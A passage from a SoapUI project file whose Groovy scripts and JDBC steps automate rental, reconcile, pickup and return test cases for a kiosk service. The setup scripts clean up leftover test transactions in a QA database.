tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
//tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("ModifiedCart", "true");
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [ModResvPickup] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ModResvPickup $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ModResvPickup $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="bf19c717-5d28-4413-ac0d-7b4a953a265e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ModResvPickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="0ee95a67-d66b-4493-bcc4-7a8e291eddc4"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property><con:property><con:name>TestCaseName</con:name><con:value>TestCase = ${=context.testCase.name}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="8a4f54d8-9d66-448d-a34a-62ed616893a3"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505");

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");
def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1982888</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058009</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>19</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-13:54:21.700</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-13:55:59.313</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648582</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>19</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d7e65004-1953-419d-8f1a-edeba3ca5d9c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f8e37a9f-a85c-4b06-b249-11958c3f2b11</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="9c307061-58f1-42b2-a6e7-8747b462fceb" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="Rental" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="43b417a9-d307-4e1a-82f8-d17ea93c056d"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:assertion type="JDBC Status" id="16865f09-f610-40e5-b403-c24818be2371" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="a8906ad3-5a0b-464d-8fb3-271772092709"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select 
	dbo.KS_RentalAutomation.ID as ID,
	dbo.KS_RentalAutomation.Scenario as Scenario, 
	dbo.KS_RentalAutomation.Email as Email, 
	dbo.KS_RentalAutomation.CreditCardNumber as CcNumber, 
	dbo.KS_RentalAutomation.CreditCardType as CCType, 
	dbo.KS_RentalAutomation.PromoCode as PromoCode, 
	dbo.KS_RentalAutomation.PromoValue as PromoValue, 
	dbo.KS_RentalAutomation.KioskID as KioskID, 
	dbo.KS_RentalAutomation.RentalFormats as rentalFormats, 
	dbo.KS_RentalAutomation.NumberOfRentals as numOfRentals, 
	dbo.KS_RentalAutomation.RentalVendStatus as RentalVendStatus, 
	dbo.KS_RentalAutomation.PurchaseFormats as PurchaseFormats, 
	dbo.KS_RentalAutomation.NumberOfPurchases as numOfPurchases, 
	dbo.KS_RentalAutomation.PurchaseVendStatus as PurchaseVendStatus, 
	dbo.KS_RentalAutomation.SetDaysBack as SetDaysBack, 
	dbo.KS_RentalAutomation.IsOffline as IsOffline,
	dbo.KS_RentalAutomation.LoyaltyFlag as LoyaltyFlag,
	dbo.KS_RentalAutomation.MDVFlag As MDVFlag, 
	dbo.KS_RentalAutomation.MDVDiscNumber As MDVDiscNumber, 
	dbo.KS_RentalAutomation.TestCaseName as TestCaseName
From 
	dbo.KS_RentalAutomation
	--Removed FraudBarcode test steps.
WHERE 
(TestCaseName is null or TestCaseName != 'FraudBarcode') 
and id = 156</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:property>MDVFlag</con:property><con:property>MDVDiscNumber</con:property><con:property>TestCaseName</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="3061d7db-1c96-4802-b7e3-3f4e49c02160"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------------" + context.testCase.name + "-------------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase [Get Customer Info From Encrypted CC] was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase [Set Up Credits] was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="eedd20d0-5450-48d7-86a2-fb27ce73d276"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("MDVFlag", context.expand( '${DataSource#MDVFlag}' ));
tc.setPropertyValue("MDVDiscNumber",context.expand( '${DataSource#MDVDiscNumber}' ));

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Reconcile" id="71828de4-eb49-46f3-ba4d-e17f75801e23"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
